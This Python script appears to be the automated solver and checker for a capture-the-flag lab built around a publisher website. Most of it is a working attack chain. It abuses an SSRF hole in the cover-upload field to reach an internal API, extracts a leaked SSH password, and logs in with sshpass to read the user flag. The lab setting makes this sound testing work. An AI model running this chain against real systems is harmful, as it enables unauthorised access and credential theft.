#!/usr/bin/env python3
"""Non-destructive tests from an independent Docker network peer."""
import json
import os
import re
import subprocess
import socket
import urllib.error
import urllib.parse
import urllib.request

HOST = "editorial-target"
BASE = "http://" + HOST

def get(path):
    with urllib.request.urlopen(BASE + path, timeout=6) as res:
        assert res.status == 200
        return res.read()

def preview(url):
    data = urllib.parse.urlencode({"bookurl": url}).encode("utf-8")
    with urllib.request.urlopen(BASE + "/upload-cover", data=data, timeout=8) as res:
        assert res.status == 200
        return res.read().decode("utf-8").strip()

assert b"Editorial Tiempo Arriba" in get("/")
assert b'name="bookurl"' in get("/upload")
assert b"ideas" in get("/about")
assert json.loads(get("/healthz"))["status"] == "ok"
with socket.create_connection((HOST, 22), timeout=5) as connection:
    assert connection.recv(32).startswith(b"SSH-2.0-")
print("PASS: publisher site, submission form, health, and native SSH banner", flush=True)

try:
    socket.create_connection((HOST, 5000), timeout=2)
except OSError:
    pass
else:
    raise AssertionError("Loopback API exposed on external network")
try:
    get("/api/latest/metadata")
except urllib.error.HTTPError as e:
    assert e.code == 404
else:
    raise AssertionError("Private API is served on the public site")
print("PASS: internal API is unreachable directly", flush=True)

assert "placeholder" in preview("http://127.0.0.1:4999/")
path = preview("http://127.0.0.1:5000/")
assert path.startswith("/static/uploads/"), path
response = json.loads(get(path))
assert response["service"] == "Editorial API"
assert "/api/latest/metadata/messages/authors" in response["links"]
path2 = preview("http://127.0.0.1:5000/api/latest/metadata")
assert path2.startswith("/static/uploads/")
metadata = json.loads(get(path2))
assert "/api/latest/metadata/messages/authors" in metadata["routes"]
print("PASS: genuine SSRF with outbound local HTTP, stored response bytes and API discovery", flush=True)

# The leaked onboarding password must work against the actual SSH server.
msg_path = preview("http://127.0.0.1:5000/api/latest/metadata/messages/authors")
message = json.loads(get(msg_path))["messages"][0]["body"]
password_match = re.search(r"Temporary password: ([^\\s.]+)", message)
assert password_match, "Internal API no longer exposes onboarding information"
env = os.environ.copy()
env["SSHPASS"] = password_match.group(1)
ssh_result = subprocess.run([
    "sshpass", "-e", "ssh", "-T",
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "PreferredAuthentications=password",
    "-o", "PubkeyAuthentication=no",
    "-o", "ConnectTimeout=5",
    "dev@" + HOST,
    "id -un; cat /home/dev/user.txt; git -C /home/dev/apps rev-list --count HEAD",
], capture_output=True, text=True, env=env, timeout=15)
assert ssh_result.returncode == 0, (ssh_result.stdout, ssh_result.stderr)
assert ssh_result.stdout.splitlines() == ["dev", "TTP{ci_user_first_instance}", "2"], ssh_result.stdout
print("PASS: private API onboarding information authenticates to SSH and retrieves User flag", flush=True)
